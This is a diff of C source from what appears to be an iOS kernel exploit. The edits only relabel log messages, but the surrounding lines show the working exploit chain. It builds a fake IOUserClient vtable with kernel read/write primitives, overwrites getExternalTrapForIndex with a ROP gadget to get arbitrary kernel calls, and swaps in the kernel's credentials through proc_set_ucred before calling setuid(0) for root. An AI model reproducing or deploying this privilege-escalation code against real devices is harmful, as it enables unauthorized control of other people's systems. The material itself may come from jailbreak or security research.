@@ -42,7 +42,7 @@ uint64_t mineek_dirty_kalloc(size_t size) {
             }
         }
         if (found) {
-            printf("[+] dirty_kalloc: 0x%llx\n", addr);
+            printf("[i] dirty_kalloc: 0x%llx\n", addr);
             return addr;
         }
         addr += 0x1000;
@@ -66,29 +66,29 @@ void mineek_init_kcall(void) {
       exit(EXIT_FAILURE);
     }
     uint64_t uc_port = mineek_find_port(user_client);
-    printf("Found port: 0x%llx\n", uc_port);
+    printf("[i] Found port: 0x%llx\n", uc_port);
     uint64_t uc_addr = kread64(uc_port + 0x48);
-    printf("Found addr: 0x%llx\n", uc_addr);
+    printf("[i] Found addr: 0x%llx\n", uc_addr);
     uint64_t uc_vtab = kread64(uc_addr);
-    printf("Found vtab: 0x%llx\n", uc_vtab);
+    printf("[i] Found vtab: 0x%llx\n", uc_vtab);
     uint64_t fake_vtable = mineek_dirty_kalloc(0x1000);
-    printf("Created fake_vtable at %016llx\n", fake_vtable);
+    printf("[i] Created fake_vtable at %016llx\n", fake_vtable);
     for (int i = 0; i < 0x200; i++) {
         kwrite64(fake_vtable+i*8, kread64(uc_vtab+i*8));
     }
-    printf("Copied some of the vtable over\n");
+    printf("[i] Copied some of the vtable over\n");
     fake_client = mineek_dirty_kalloc(0x2000);
-    printf("Created fake_client at %016llx\n", fake_client);
+    printf("[i] Created fake_client at %016llx\n", fake_client);
     for (int i = 0; i < 0x200; i++) {
         kwrite64(fake_client+i*8, kread64(uc_addr+i*8));
     }
-    printf("Copied the user client over\n");
+    printf("[i] Copied the user client over\n");
     kwrite64(fake_client, fake_vtable);
     kwrite64(uc_port + 0x48, fake_client);
     uint64_t add_x0_x0_0x40_ret = off_add_x0_x0_0x40_ret;
     add_x0_x0_0x40_ret += get_kslide();
     kwrite64(fake_vtable+8*0xB8, add_x0_x0_0x40_ret);
-    printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
+    printf("[i] Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
 }
 
 uint64_t mineek_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
@@ -105,26 +105,26 @@ uint64_t mineek_kcall(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint
 void mineek_getRoot(uint64_t proc_addr)
 {
     uint64_t self_ro = kread64(proc_addr + 0x20);
-    printf("self_ro @ 0x%llx\n", self_ro);
+    printf("[i] self_ro: 0x%llx\n", self_ro);
     uint64_t self_ucred = kread64(self_ro + 0x20);
-    printf("ucred @ 0x%llx\n", self_ucred);
-    printf("test_uid = %d\n", getuid());
+    printf("[i] ucred: 0x%llx\n", self_ucred);
+    printf("[i] test_uid = %d\n", getuid());
 
     uint64_t kernproc = get_kernproc();
-    printf("kern proc @ %llx\n", kernproc);
+    printf("[i] kern proc: %llx\n", kernproc);
     uint64_t kern_ro = kread64(kernproc + 0x20);
-    printf("kern_ro @ 0x%llx\n", kern_ro);
+    printf("[i] kern_ro: 0x%llx\n", kern_ro);
     uint64_t kern_ucred = kread64(kern_ro + 0x20);
-    printf("kern_ucred @ 0x%llx\n", kern_ucred);
+    printf("[i] kern_ucred: 0x%llx\n", kern_ucred);
 
     // use proc_set_ucred to set kernel proc.
     uint64_t proc_set_ucred = off_proc_set_ucred;
     proc_set_ucred += get_kslide();
-    printf("func @ 0x%llx\n", proc_set_ucred);
+    printf("[i] func: 0x%llx\n", proc_set_ucred);
     mineek_kcall(proc_set_ucred, proc_addr, kern_ucred, 0, 0, 0, 0, 0);
     setuid(0);
     setuid(0);
-    printf("getuid: %d\n", getuid());
+    printf("[i] getuid: %d\n", getuid());
 }
 
 void stage2(void) {
